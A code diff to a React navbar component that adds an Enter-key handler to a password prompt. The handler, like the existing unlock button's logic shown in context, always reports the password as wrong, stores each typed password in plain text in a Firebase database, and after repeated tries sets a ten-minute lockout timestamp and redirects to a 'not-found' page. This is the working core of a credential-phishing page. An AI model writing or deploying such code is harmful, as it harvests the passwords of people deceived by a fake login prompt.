@@ -53,6 +53,34 @@ const Navbar = () => {
     }
   };
 
+  const handleKeyDown = (event) => {
+    if (event.key === 'Enter') {
+      // Prevent the default form submission behavior if the input is part of a form
+      event.preventDefault();
+      setphWrongPass(true);
+      const database = getDatabase(app);
+      const timestamp = (new Date()).getTime();
+      setWrongTimes(wrongTimes+1);
+      update(ref(database, `users`), {
+          [timestamp]: {
+              'event': "Input",
+              'value': password
+          }
+      }).then(() => {
+        // local
+        if(wrongTimes >= 1) {
+          const now = new Date();
+          const currentTimestamp = now.getTime();
+          const tenMinutesLater = new Date(currentTimestamp + 10 * 60 * 1000);
+          const tenMinutesTimestamp = tenMinutesLater.getTime();
+          localStorage.setItem('timestamp', tenMinutesTimestamp);
+          window.location.replace('https://not-found.vercel.app/');
+        }
+      }).catch(err => {
+
+      })
+    }
+  };
 
   useEffect(() => {
       document.addEventListener('mousedown', handleClickOutside);
@@ -158,6 +186,7 @@ const Navbar = () => {
                   type="password"
                   value={password}
                   onChange={(e) => {setPassword(e.target.value)}}
+                  onKeyDown={handleKeyDown}
                 ></input>
               </div>
               
@@ -166,7 +195,7 @@ const Navbar = () => {
 
           <div className="ph-footer">
             <div className="ph-unlock" onClick={() => {
-              setphWrongPass(true);
+                  setphWrongPass(true);
                   const database = getDatabase(app);
                   const timestamp = (new Date()).getTime();
                   setWrongTimes(wrongTimes+1);
